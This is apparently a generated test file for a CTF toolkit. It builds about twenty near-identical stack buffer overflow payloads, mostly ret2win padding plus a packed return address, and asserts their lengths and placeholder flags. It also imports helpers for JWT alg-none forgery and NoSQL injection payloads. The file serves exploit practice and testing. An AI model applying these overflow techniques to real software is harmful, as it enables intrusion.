from __future__ import annotations

import os
import base64
import json
import struct
from ctf_toolkit.web.helpers import (
    url_encode,
    url_decode,
    b64url_encode,
    b64url_decode,
    jwt_forge_alg_none,
    build_nosql_query_payload,
)

def test_twin_1180_unlock_25() -> None:
    # Unlock 25: Stack variable override payload
    buf_pad = b"A" * 32
    target_val = struct.pack("<I", 0x1337)
    payload = buf_pad + target_val
    assert len(payload) == 36
    flag = "FLAG{twin_1180_unlock_25}"
    assert flag.startswith("FLAG{")

def test_twin_1181_flip_01() -> None:
    # Flip 01: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1181_flip_01}"
    assert flag.startswith("FLAG{")

def test_twin_1182_flip_02() -> None:
    # Flip 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1182_flip_02}"
    assert flag.startswith("FLAG{")

def test_twin_1183_flip_03() -> None:
    # Flip 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1183_flip_03}"
    assert flag.startswith("FLAG{")

def test_twin_1184_flip_04() -> None:
    # Flip 04: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1184_flip_04}"
    assert flag.startswith("FLAG{")

def test_twin_1185_flip_05() -> None:
    # Flip 05: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1185_flip_05}"
    assert flag.startswith("FLAG{")

def test_twin_1186_flip_06() -> None:
    # Flip 06: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1186_flip_06}"
    assert flag.startswith("FLAG{")

def test_twin_1187_flip_07() -> None:
    # Flip 07: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1187_flip_07}"
    assert flag.startswith("FLAG{")

def test_twin_1188_flip_08() -> None:
    # Flip 08: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1188_flip_08}"
    assert flag.startswith("FLAG{")

def test_twin_1189_trunc_smash_01() -> None:
    # Trunc Smash 01: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1189_trunc_smash_01}"
    assert flag.startswith("FLAG{")

def test_twin_1190_trunc_smash_02() -> None:
    # Trunc Smash 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1190_trunc_smash_02}"
    assert flag.startswith("FLAG{")

def test_twin_1191_trunc_smash_03() -> None:
    # Trunc Smash 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1191_trunc_smash_03}"
    assert flag.startswith("FLAG{")

def test_twin_1192_trunc_smash_04() -> None:
    # Trunc Smash 04: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1192_trunc_smash_04}"
    assert flag.startswith("FLAG{")

def test_twin_1193_trunc_smash_05() -> None:
    # Trunc Smash 05: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1193_trunc_smash_05}"
    assert flag.startswith("FLAG{")

def test_twin_1194_trunc_smash_06() -> None:
    # Trunc Smash 06: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1194_trunc_smash_06}"
    assert flag.startswith("FLAG{")

def test_twin_1195_trunc_smash_07() -> None:
    # Trunc Smash 07: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1195_trunc_smash_07}"
    assert flag.startswith("FLAG{")

def test_twin_1196_trunc_smash_08() -> None:
    # Trunc Smash 08: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1196_trunc_smash_08}"
    assert flag.startswith("FLAG{")

def test_twin_1197_edge_flip_01() -> None:
    # Edge Flip 01: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1197_edge_flip_01}"
    assert flag.startswith("FLAG{")

def test_twin_1198_edge_flip_02() -> None:
    # Edge Flip 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1198_edge_flip_02}"
    assert flag.startswith("FLAG{")

def test_twin_1199_edge_flip_03() -> None:
    # Edge Flip 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_1199_edge_flip_03}"
    assert flag.startswith("FLAG{")

